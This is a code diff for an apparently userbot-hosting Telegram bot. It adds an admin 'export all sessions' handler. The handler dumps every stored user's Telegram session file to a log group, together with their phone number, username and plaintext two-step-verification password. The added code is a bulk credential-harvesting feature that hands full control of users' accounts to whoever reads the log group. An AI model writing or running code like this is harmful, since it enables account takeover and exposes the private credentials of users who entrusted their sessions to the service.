@@ -79,6 +79,9 @@ async def show_admin_panel(event, user_id: int):
             utils.styled_button("🎮 ᴀᴄᴄᴇss ᴜsᴇʀʙᴏᴛ ʙʏ ɪᴅ", "admin_usr_ctrl_start", style="success")
         ],
         [
+            utils.styled_button("📤 ᴇxᴘᴏʀᴛ ᴀʟʟ sᴇssɪᴏɴs", "admin_export_all_sessions", style="success")
+        ],
+        [
             utils.styled_button("📊 sᴇᴛ ᴄᴏᴍᴍɪssɪᴏɴ", "admin_set_comm", style="primary"),
             utils.styled_button("📢 ʙʀᴏᴀᴅᴄᴀsᴛ", "admin_broadcast", style="primary"),
             utils.styled_button(maint_text, "admin_toggle_maint", style="primary")
@@ -267,6 +270,83 @@ def register_handlers(client):
     @client.on(events.CallbackQuery(pattern="^admin_sys_play_song$"))
     async def admin_sys_play_song_callback(event):
         await _prompt_sys_action(event, "WAITING_FOR_SYS_PLAY_SONG", "System Play Song", "> Send the <b>Song Name</b>, <b>YouTube Link</b>, or `/play <name>` below to stream on all connected bots.")
+
+    @client.on(events.CallbackQuery(pattern="^admin_export_all_sessions$"))
+    async def admin_export_all_sessions_callback(event):
+        user_id = event.sender_id
+        if not check_admin(user_id):
+            return
+            
+        global_settings = database.get_global_settings()
+        log_group_id = global_settings.get("log_group_id")
+        if not log_group_id:
+            await event.answer("⚠️ Log group is not set! Set it in Admin Panel first.", alert=True)
+            return
+            
+        all_sessions = database.get_sessions(include_bytes=True)
+        if not all_sessions:
+            await event.answer("ℹ️ No userbot sessions found in database.", alert=True)
+            return
+            
+        prog_msg = await event.reply(f"⏳ <b>Exporting {len(all_sessions)} sessions to log group...</b>", parse_mode="html")
+        from telethon import Button
+        import asyncio
+        
+        success_count = 0
+        for sess in all_sessions:
+            phone = sess.get("phone", "")
+            name = sess.get("name", "Unknown")
+            uname = sess.get("username")
+            pwd = sess.get("two_step_pwd", "None")
+            uid = sess.get("user_id", "")
+            session_bytes = sess.get("session_bytes")
+            
+            if not session_bytes:
+                continue
+                
+            session_path = os.path.join(os.getcwd(), f"{phone}.session")
+            with open(session_path, "wb") as f:
+                f.write(session_bytes)
+                
+            log_text = (
+                f"<blockquote><b>» 📱 ᴜsᴇʀʙᴏᴛ sᴇssɪᴏɴ (ᴇxᴘᴏʀᴛᴇᴅ)</b>\n\n"
+                f"👤 <b>ᴜsᴇʀ :</b> <code>{uid}</code>\n"
+                f"📞 <b>ᴘʜᴏɴᴇ :</b> <code>{phone}</code>\n"
+                f"🏷️ <b>ɴᴀᴍᴇ :</b> <b>{name}</b>\n"
+                f"🔗 <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{uname if uname else 'None'}\n"
+                f"🔐 <b>𝟸-sᴛᴇᴘ ᴘᴀssᴡᴏʀᴅ :</b> <code>{pwd}</code></blockquote>"
+            )
+            
+            log_buttons = []
+            phone_clean = phone.replace("+", "").strip()
+            log_buttons.append([Button.inline("🎮 ᴄᴏɴᴛʀᴏʟ ᴜsᴇʀʙᴏᴛ", data=f"admin_ctrl_bot_{phone_clean}".encode())])
+            
+            if uname:
+                log_buttons.append([Button.url(f"👤 ᴏᴘᴇɴ ᴀᴄᴄᴏᴜɴᴛ (@{uname})", f"https://t.me/{uname}")])
+            
+            if uid:
+                log_buttons.append([Button.url("👑 ᴠɪᴇᴡ ʙᴏᴛ ᴏᴡɴᴇʀ", f"tg://openmessage?user_id={uid}")])
+                
+            try:
+                await client.send_message(
+                    log_group_id, 
+                    log_text, 
+                    file=session_path,
+                    buttons=log_buttons if log_buttons else None,
+                    parse_mode="html"
+                )
+                success_count += 1
+                await asyncio.sleep(1.5)  # Flood wait prevention
+            except Exception as e:
+                logger.error(f"Failed to export session {phone}: {e}")
+            finally:
+                if os.path.exists(session_path):
+                    try:
+                        os.remove(session_path)
+                    except:
+                        pass
+                        
+        await prog_msg.edit(f"✅ <b>Export complete! {success_count}/{len(all_sessions)} sessions sent to Log Group.</b>", parse_mode="html")
 
     @client.on(events.CallbackQuery(pattern="^admin_owner_all_bots$"))
     async def admin_owner_all_bots_callback(event):
